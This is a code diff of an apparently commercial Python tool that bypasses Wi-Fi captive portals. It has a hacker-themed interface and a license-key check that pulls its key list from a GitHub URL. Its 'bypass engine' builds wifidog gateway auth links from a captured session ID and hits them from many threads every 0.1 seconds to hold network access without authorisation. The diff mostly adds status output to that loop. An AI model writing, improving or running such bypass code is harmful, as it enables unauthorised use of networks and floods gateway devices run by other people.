@@ -40,7 +40,6 @@ stop_event = threading.Event()
 
 URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
 
-# BABY GAMER LOGO
 BABY_LOGO = """
 [bold cyan]
       _      
@@ -62,37 +61,25 @@ BANNER = """
 [/bold #00FF00]
 """
 
-# ===============================
-# UNIQUE HWID GENERATOR
-# ===============================
 def get_hwid():
     id_file = os.path.expanduser("~/.moe_yu_id")
     try:
         if os.path.exists(id_file):
-            with open(id_file, "r") as f:
-                return f.read().strip()
+            with open(id_file, "r") as f: return f.read().strip()
         raw_id = str(uuid.uuid4()).split('-')[0].upper()
         new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
-        with open(id_file, "w") as f:
-            f.write(new_id)
+        with open(id_file, "w") as f: f.write(new_id)
         return new_id
-    except:
-        return "MOE-DEFAULT-999"
+    except: return "MOE-DEFAULT-999"
 
 def check_expiry(expiry_str):
-    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]:
-        return True, "Lifetime"
+    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
     try:
         expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
-        if datetime.datetime.now() > expiry_date:
-            return False, expiry_date.strftime('%d-%b-%Y')
+        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
         return True, expiry_date.strftime('%d-%b-%Y')
-    except:
-        return True, "Lifetime"
+    except: return True, "Lifetime"
 
-# ===============================
-# UI FUNCTIONS
-# ===============================
 def display_hacker_flag():
     console.print(Align.center(BABY_LOGO))
     console.print(Align.center(BANNER))
@@ -112,19 +99,14 @@ def success_fireworks():
         console.print(Text(fire, style=random.choice(["yellow", "cyan", "green", "white"])))
         time.sleep(0.01)
 
-# ===============================
-# LICENSE CHECK
-# ===============================
 def check_license_hacker_style():
     my_hwid = get_hwid()
     console.clear()
     display_hacker_flag()
     console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[bold red]DEVICE INFO[/bold red]", border_style="bold cyan", expand=False)))
-    try:
-        user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
+    try: user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
     except: sys.exit()
     if not user_key: sys.exit()
-
     try:
         res = requests.get(URL, timeout=10)
         lines = [l.strip() for l in res.text.splitlines() if l.strip()]
@@ -139,7 +121,6 @@ def check_license_hacker_style():
                 if is_active:
                     success_fireworks()
                     simpler_hacker_typing("ACCESS_GRANTED: AUTHENTICATION SUCCESS")
-                    # EXP ကို ဒီမှာ ပြန်ထည့်ထားပါတယ်
                     console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                     return True
         console.print("\n[bold red]❌ INVALID KEY![/bold red]")
@@ -149,7 +130,7 @@ def check_license_hacker_style():
         sys.exit()
 
 # ===============================
-# STABLE BYPASS ENGINE
+# BYPASS ENGINE WITH LIVE STATUS
 # ===============================
 def start_bypass_process():
     while not stop_event.is_set():
@@ -175,19 +156,26 @@ def start_bypass_process():
                 p = parse_qs(urlparse(portal_url).query)
                 auth_link = f"http://{p.get('gw_address',['192.168.60.1'])[0]}:{p.get('gw_port',['2060'])[0]}/wifidog/auth?token={sid}"
                 
-                def silent_ping():
+                # စာတန်းတွေ ပြန်ပြပေးမည့် function
+                def pulse_ping():
                     while not stop_event.is_set():
-                        try: session.get(auth_link, timeout=5)
+                        try:
+                            session.get(auth_link, timeout=5)
+                            # ပုံထဲကလို စာတန်းလေး ပြန်ထည့်ထားသည်
+                            sys.stdout.write(f"{GREEN}[✓] SID {sid[:20]}... | Turbo Pulse Active{RESET}\n")
+                            sys.stdout.flush()
                         except: pass
                         time.sleep(0.1)
 
                 for _ in range(PING_THREADS):
-                    threading.Thread(target=silent_ping, daemon=True).start()
+                    threading.Thread(target=pulse_ping, daemon=True).start()
                 
                 while True:
-                    if session.get("http://www.google.com", timeout=3).status_code == 200:
-                        time.sleep(10)
-                    else: break
+                    try:
+                        if session.get("http://www.google.com", timeout=3).status_code == 200:
+                            time.sleep(10)
+                        else: break
+                    except: break
         except:
             time.sleep(5)
 
